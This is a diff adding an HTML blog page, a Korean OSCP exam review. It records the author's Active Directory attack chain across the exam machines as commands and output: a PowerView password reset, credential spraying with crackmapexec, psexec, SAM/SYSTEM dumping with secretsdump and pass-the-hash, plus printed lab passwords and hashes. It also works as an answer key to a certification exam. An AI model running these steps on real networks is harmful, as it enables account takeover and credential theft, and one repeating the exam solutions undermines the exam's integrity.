@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html id="R-html" lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article" data-r-output-format="html">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Relearn 9.0.3+5fff5bc8a066e83e5f67f0de49c7dfb57379219e">
+    <meta name="description" content="결과 우선 결과는 60점.
+윈도우 머신 전부 풀었다.
+stand alone은 하나만 proof까지 풀었다.
+AD공략은 생각보다 쉬웠는데 stand alone은 초기 진입 실패하면 그냥 끝이다.
+어느정도 운도 필요한 듯.
+Active Directory WS26 .206 처음 크레덴셜이 ( r.andrews / BusyOfficeWorker890 ) 주어지고 진입해야 하는 머신.">
+    <meta name="author" content="">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="OSCP 시험 후기 :: Dragonfly Commando">
+    <meta name="twitter:description" content="결과 우선 결과는 60점.
+윈도우 머신 전부 풀었다.
+stand alone은 하나만 proof까지 풀었다.
+AD공략은 생각보다 쉬웠는데 stand alone은 초기 진입 실패하면 그냥 끝이다.
+어느정도 운도 필요한 듯.
+Active Directory WS26 .206 처음 크레덴셜이 ( r.andrews / BusyOfficeWorker890 ) 주어지고 진입해야 하는 머신.">
+    <meta property="og:url" content="http://localhost:1313/private/oscp/index.html">
+    <meta property="og:site_name" content="Dragonfly Commando">
+    <meta property="og:title" content="OSCP 시험 후기 :: Dragonfly Commando">
+    <meta property="og:description" content="결과 우선 결과는 60점.
+윈도우 머신 전부 풀었다.
+stand alone은 하나만 proof까지 풀었다.
+AD공략은 생각보다 쉬웠는데 stand alone은 초기 진입 실패하면 그냥 끝이다.
+어느정도 운도 필요한 듯.
+Active Directory WS26 .206 처음 크레덴셜이 ( r.andrews / BusyOfficeWorker890 ) 주어지고 진입해야 하는 머신.">
+    <meta property="og:locale" content="en_us">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="Private">
+    <meta property="article:published_time" content="2026-03-10T22:39:02+09:00">
+    <meta property="article:modified_time" content="2026-03-10T22:39:02+09:00">
+    <meta itemprop="name" content="OSCP 시험 후기 :: Dragonfly Commando">
+    <meta itemprop="description" content="결과 우선 결과는 60점.
+윈도우 머신 전부 풀었다.
+stand alone은 하나만 proof까지 풀었다.
+AD공략은 생각보다 쉬웠는데 stand alone은 초기 진입 실패하면 그냥 끝이다.
+어느정도 운도 필요한 듯.
+Active Directory WS26 .206 처음 크레덴셜이 ( r.andrews / BusyOfficeWorker890 ) 주어지고 진입해야 하는 머신.">
+    <meta itemprop="datePublished" content="2026-03-10T22:39:02+09:00">
+    <meta itemprop="dateModified" content="2026-03-10T22:39:02+09:00">
+    <meta itemprop="wordCount" content="741">
+    <title>OSCP 시험 후기 :: Dragonfly Commando</title>
+    <link href="/images/favicon.png?1773151229" rel="icon" type="image/png">
+    <link href="/css/auto-complete/auto-complete.min.css?1773151229" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1773151229" defer></script>
+    <script src="/js/search-lunr.js?1773151229" defer></script>
+    <script src="/js/search.js?1773151229" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.index_js_url="/searchindex.en.js?1773151229";
+    </script>
+    <script src="/js/lunr/lunr.min.js?1773151229" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1773151229" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1773151229" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1773151229" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.contentLangs=['en'];
+    </script>
+    <link href="/fonts/fontawesome/css/all.min.css?1773151229" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1773151229" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1773151229" rel="stylesheet">
+    <link href="/css/theme.css?1773151229" rel="stylesheet">
+    <link href="/css/format-html.css?1773151229" rel="stylesheet" id="R-format-style">
+    <script>
+      window.relearn = window.relearn || {};
+      // configuration
+      window.relearn.min = ``;
+      window.relearn.path='\/private\/oscp\/index.html';
+      window.relearn.relBasePath='..\/..';
+      window.relearn.relBaseUri='..\/..';
+      window.relearn.absBaseUri='http:\/\/localhost:1313';
+      window.relearn.disableInlineCopyToClipboard=false;
+      window.relearn.enableBlockCodeWrap=true;
+      // translations
+      window.T_Copy_to_clipboard = `Copy text to clipboard`;
+      window.T_Copied_to_clipboard = `Text copied to clipboard!`;
+      window.T_Link_copied_to_clipboard = `Link copied to clipboard!`;
+      window.T_Reset_view = `Reset view`;
+      window.T_View_reset = `View reset!`;
+      window.T_No_results_found = `No results found for "{0}"`;
+      window.T_N_results_found = `{1} results found for "{0}"`;
+      window.T_Browser_unsupported_feature = `This browser doesn't support this feature`;
+      // variant stuff
+      window.relearn.themevariants = [ 'auto' ];
+      window.relearn.customvariantprefix = "my-custom-";
+      window.relearn.changeVariant = function(variant) {
+        var oldVariant = document.documentElement.dataset.rThemeVariant;
+        window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        document.documentElement.dataset.rThemeVariant = variant;
+        if (oldVariant != variant) {
+          document.dispatchEvent( new CustomEvent('themeVariantLoaded', { detail: { variant, oldVariant } }) );
+          window.relearn.markVariant();
+        }
+      }
+      window.relearn.markVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant");
+        document.querySelectorAll(".R-variantswitcher select").forEach((select) => {select.value = variant;});
+      }
+      window.relearn.initVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant") ?? "";
+        if( !variant ||
+            (!variant.startsWith(window.relearn.customvariantprefix) && !window.relearn.themevariants.includes(variant)) ||
+            (variant.startsWith(window.relearn.customvariantprefix) && !window.localStorage.getItem(window.relearn.absBaseUri + "/variantstylesheet-" + variant)) ){
+          variant = window.relearn.themevariants[0];
+          window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        }
+        document.documentElement.dataset.rThemeVariant = variant;
+      }
+      window.relearn.initVariant();
+      window.relearn.markVariant();
+    </script>
+  </head>
+  <body class="mobile-support html" data-origin="/private/oscp/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar" class="default-animation">
+        <div class="topbar-wrapper default-animation">
+          <div class="topbar-sidebar-divider default-animation"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar default-animation" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button></span>
+            </div>
+            <div class="topbar-button topbar-button-toc default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-table-list"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+<nav class="TableOfContents">
+  <ul>
+    <li><a href="#ws26-206">WS26 .206</a>
+      <ul>
+        <li><a href="#admin">Admin</a></li>
+      </ul>
+    </li>
+    <li><a href="#srv22-202">SRV22 .202</a></li>
+    <li><a href="#dc200-200">DC200 .200</a></li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Dragonfly Commando</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/private/index.html"><span itemprop="name">Private</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">OSCP 시험 후기</span><meta itemprop="position" content="3"></li>
+          </ol>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-prev default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/private/index.html" title="Private (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-next default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/writeup/index.html" title="Writeup (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-more default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable private" tabindex="-1">
+        <div class="flex-block-wrapper">
+<article class="default">
+  <header class="headline">
+  </header>
+
+<h1 id="oscp-시험-후기">OSCP 시험 후기</h1>
+
+<h1 id="결과">결과<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<p>우선 결과는 60점.</p>
+<p>윈도우 머신 전부 풀었다.</p>
+<p>stand alone은 하나만 proof까지 풀었다.</p>
+<p>AD공략은 생각보다 쉬웠는데 stand alone은 초기 진입 실패하면 그냥 끝이다.</p>
+<p>어느정도 운도 필요한 듯.</p>
+<h1 id="active-directory">Active Directory<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<h2 id="ws26-206">WS26 .206<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>처음 크레덴셜이 ( r.andrews / BusyOfficeWorker890 ) 주어지고 진입해야 하는 머신.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>WS26.oscp.exam
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-03-05T23:59:45
+</span></span><span style="display:flex;"><span>|_Not valid after:  2026-09-04T23:59:45
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info:
+</span></span><span style="display:flex;"><span>|   Target_Name: OSCP
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: OSCP
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: WS26
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: oscp.exam
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: WS26.oscp.exam
+</span></span><span style="display:flex;"><span>|   DNS_Tree_Name: oscp.exam
+</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.22621
+</span></span><span style="display:flex;"><span>|_  System_Time: 2026-03-07T00:17:03+00:00
+</span></span><span style="display:flex;"><span>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found</span></span></code></pre></div>
+<p><strong>evil-winrm</strong>을 사용해서 접속했다.</p>
+<p>처음에 모든 enum을 실시했는데 하나도 공격 벡터로 이어지는게 없었다.</p>
+<p>powerview, winpeas, 스케줄태스크, 서비스들, 내부네트워크 등등</p>
+<p>enum만 3시간 정도 시간 사용.</p>
+<p>결국 <strong>bloodhound</strong>로 단서를 찾았다.</p>
+<p>r.andrews -&gt; g.jarvis에 AllExtendRights가 있었다.</p>
+<p>아래 순서대로 입력하면 g.jarvis의 비밀번호를 변경할 수 있다.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\users\r.andrews\Documents&gt; Import-Module .\PowerView.ps1
+</span></span><span style="display:flex;"><span>PS C:\users\r.andrews\Documents&gt; $NewPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;Password1234&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS C:\users\r.andrews\Documents&gt; Set-DomainUserPassword -Identity <span style="color:#e6db74">&#39;g.jarvis&#39;</span> -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cmdlet Set-DomainUserPassword at command pipeline <span style="color:#a6e22e">position</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Supply values <span style="color:#66d9ef">for</span> the following parameters<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>AccountPassword<span style="color:#960050;background-color:#1e0010">:</span> ************
+</span></span><span style="display:flex;"><span>VERBOSE<span style="color:#960050;background-color:#1e0010">:</span> [Set-DomainUserPassword] Attempting to set the password <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;g.jarvis&#39;</span>
+</span></span><span style="display:flex;"><span>VERBOSE<span style="color:#960050;background-color:#1e0010">:</span> [Set-DomainUserPassword] Password <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;g.jarvis&#39;</span> successfully reset</span></span></code></pre></div>
+<p>이후 g.jarvis로 이동.</p>
+<p>winpeas를 실행하고 잘 살펴보면 관리자의 크레덴셜이 적혀있었다.</p>
+<p><code>administrator / CarHammerChip964</code></p>
+<p>알고나면 엄청 간단한데 bloodhound를 너무 늦게 확인하는 바람에 3시간이나 써버렸다.</p>
+<p>너무 복잡하면 공격 벡터가 아닐 확률이 높다.</p>
+<h3 id="admin">Admin<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
+<p>관리자로 다음 타겟의 크레덴셜을 찾아야한다.</p>
+<p>mimikatz를 실행해서 명령어를 다 넣어봤는데 걸리는 크레덴셜이 하나도 없었다.</p>
+<p>파워쉘 히스토리를 보니까 다음 유저의 크레덴셜이 있었다.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSREadline&gt; type ConsoleHost_history.txt
+</span></span><span style="display:flex;"><span>Get-Service | Where-Object {.Status <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;Running&#34;</span>}
+</span></span><span style="display:flex;"><span>Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size
+</span></span><span style="display:flex;"><span>Get-Process | Sort-Object CPU -Descending | Select-Object -First <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>Get-NetAdapter | Where-Object {.Status <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;Up&#34;</span>}
+</span></span><span style="display:flex;"><span>Get-ChildItem -Path C:\ -Recurse | Where-Object {.Length <span style="color:#f92672">-gt</span> <span style="color:#ae81ff">100</span>MB}
+</span></span><span style="display:flex;"><span>Invoke-Command -ComputerName DC20 -ScriptBlock {Get-ADUser -Filter * -Properties LastLogonDate}
+</span></span><span style="display:flex;"><span>New-ADUser -Name <span style="color:#e6db74">&#34;Barrett Martin&#34;</span> -SamAccountName <span style="color:#e6db74">&#34;b.martin&#34;</span> -UserPrincipalName <span style="color:#e6db74">&#34;b.martin@oscp.exam&#34;</span> -AccountPassword (ConvertTo-SecureString <span style="color:#e6db74">&#34;BusyWorkerDay777&#34;</span> -AsPlainText -Force) -Enabled True
+</span></span><span style="display:flex;"><span>Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force -Confirm:False
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span style="color:#66d9ef">System.Net.SecurityProtocolType</span>]<span style="color:#e6db74">&#39;Ssl3,Tls,Tls11,Tls12&#39;</span>;
+</span></span><span style="display:flex;"><span> = <span style="color:#e6db74">&#39;https://raw.githubusercontent.com/stevencohn/WindowsPowerShell/main&#39;</span></span></span></code></pre></div>
+<p>이건 그래도 빨리 찾아냈는데, 파일안에 숨기는 패턴이 나왔었다고 생각하면 끔찍하다.</p>
+<h2 id="srv22-202">SRV22 .202<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p><code>b.martin / BusyWorkerDay777</code>로 접속</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   Target_Name: OSCP
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: OSCP
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: SRV22
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: oscp.exam
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: SRV22.oscp.exam
+</span></span><span style="display:flex;"><span>|   DNS_Tree_Name: oscp.exam
+</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>|_  System_Time: 2026-03-07T08:39:50+00:00
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SRV22.oscp.exam
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-03-05T23:59:29
+</span></span><span style="display:flex;"><span>|_Not valid after:  2026-09-04T23:59:29
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-03-07T08:40:30+00:00; +1s from scanner time.
+</span></span><span style="display:flex;"><span>8080/tcp open  http          Jetty 10.0.20
+</span></span><span style="display:flex;"><span>|_http-server-header: Jetty<span style="color:#f92672">(</span>10.0.20<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+</span></span><span style="display:flex;"><span>|_/
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html;charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.</span></span></code></pre></div>
+<p>3389가 열려있어서 리모트데스크탑으로 연결했다.</p>
+<p><code>xfreerdp3 /v:172.16.122.202 /u:b.martin /p:BusyWorkerDay777 /size:1200x900</code></p>
+<p>시작화면에서 터미널이 실행안되지만, 폴더의 어드레스바에 cmd를 입력해서 터미널을 여는데 성공.</p>
+<p>8080포트에 웹서버가 있는데 이건 함정이었다.</p>
+<p>취약점이 없는 jenkins가 있었다.</p>
+<p><strong>Program Files</strong>에 mssql가 있는걸 발견했다.</p>
+<p>터미널에 <code>sqlcmd</code>를 입력하면 mssql 인터액티브 창이 실행된다.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>SELECT name FROM master.dbo.sysdatabases;
+</span></span><span style="display:flex;"><span>go
+</span></span><span style="display:flex;"><span>use accounts;
+</span></span><span style="display:flex;"><span>go
+</span></span><span style="display:flex;"><span>SELECT table_name FROM information_schema.tables;
+</span></span><span style="display:flex;"><span>go
+</span></span><span style="display:flex;"><span>select * from creds;
+</span></span><span style="display:flex;"><span>go</span></span></code></pre></div>
+<p>여기서 유저들의 정보를 대량 발견.</p>
+<p>스프레이로 유효한 어카운트를 찾았다.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 172.16.122.202 -u c.rogers -p SnoozeRinseRevolve231 --shares
+</span></span><span style="display:flex;"><span>SMB         172.16.122.202  <span style="color:#ae81ff">445</span>    SRV22            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:SRV22<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:oscp.exam<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         172.16.122.202  <span style="color:#ae81ff">445</span>    SRV22            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> oscp.exam<span style="color:#ae81ff">\c</span>.rogers:SnoozeRinseRevolve231 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         172.16.122.202  <span style="color:#ae81ff">445</span>    SRV22            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         172.16.122.202  <span style="color:#ae81ff">445</span>    SRV22            Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         172.16.122.202  <span style="color:#ae81ff">445</span>    SRV22            -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         172.16.122.202  <span style="color:#ae81ff">445</span>    SRV22            ADMIN$          READ,WRITE      Remote Admin
+</span></span><span style="display:flex;"><span>SMB         172.16.122.202  <span style="color:#ae81ff">445</span>    SRV22            C$              READ,WRITE      Default share
+</span></span><span style="display:flex;"><span>SMB         172.16.122.202  <span style="color:#ae81ff">445</span>    SRV22            IPC$            READ            Remote IPC</span></span></code></pre></div>
+<p><code>impacket-psexec</code>으로 관리자 터미널 실행.</p>
+<p><code>impacket-psexec oscp.exam/c.rogers:SnoozeRinseRevolve231@172.16.122.202</code></p>
+<h2 id="dc200-200">DC200 .200<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>c.rogers의 크레덴셜로 마지막 DC까지 로그인</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                    State
+</span></span><span style="display:flex;"><span>============================= ============================== =======
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain     Enabled
+</span></span><span style="display:flex;"><span>SeBackupPrivilege             Back up files and directories  Enabled
+</span></span><span style="display:flex;"><span>SeRestorePrivilege            Restore files and directories  Enabled
+</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system           Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span></span></code></pre></div>
+<p><code>SeBackupPrivilege</code>가 있다.</p>
+<p>evil-winrm이 있으면 download로 파일을 옮길 수 있어서, 포트포워딩도 필요 없어서 너무 편하다.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\c.rogers&gt;  reg save hklm\sam sam
+</span></span><span style="display:flex;"><span>The operation completed successfully.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\c.rogers&gt; reg save hklm\system system
+</span></span><span style="display:flex;"><span>The operation completed successfully.</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump -sam sam -system system local
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0xd359caefd2dd5a5551dd5a71481c194e
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping local SAM hashes <span style="color:#f92672">(</span>uid:rid:lmhash:nthash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:f1932cc134540745795a0c48f58cfc49:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...</span></span></code></pre></div>
+<p>관리자의 해시를 획득.</p>
+<p><code>evil-winrm -i 172.16.122.200 -u administrator -H f1932cc134540745795a0c48f58cfc49</code></p>
+<p>이걸로 도메인 어드민의 플래그까지 획득.</p>
+
+  <footer class="footline">
+              <i class='fa-fw fas fa-calendar'></i> Mar 10, 2026
+  </footer>
+</article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <a id="R-logo" class="R-default direction-row" href="/index.html">
+          <span class="logo-title default-animation">Dragonfly Commando</span>
+        </a>
+        <search><form action="/search/index.html" method="get">
+          <div class="searchbox default-animation">
+            <button class="search-detail" type="submit" title="Search (CTRL+ALT+f)"><i class="fas fa-fw fa-search"></i></button>
+            <label class="a11y-only" for="R-search-by">Search</label>
+            <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+            <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-fw fa-times" title="Clear search"></i></button>
+          </div>
+        </form></search>
+      </div>
+      <div id="R-homelinks" class="default-animation homelinks">
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-homelinks default-animation">
+          <ul class="space collapsible-menu">
+            <li class="" data-nav-id="/index.html"><a class="padding" href="/index.html"><i class="fa-fw fas fa-home"></i> Home</a></li>
+          </ul>
+        </div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-headercontrols default-animation">
+          <ul class="">
+          </ul>
+        </div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div class="R-sidebarmenu R-shortcutmenu-main default-animation">
+          <ul class="enlarge morespace collapsible-menu">
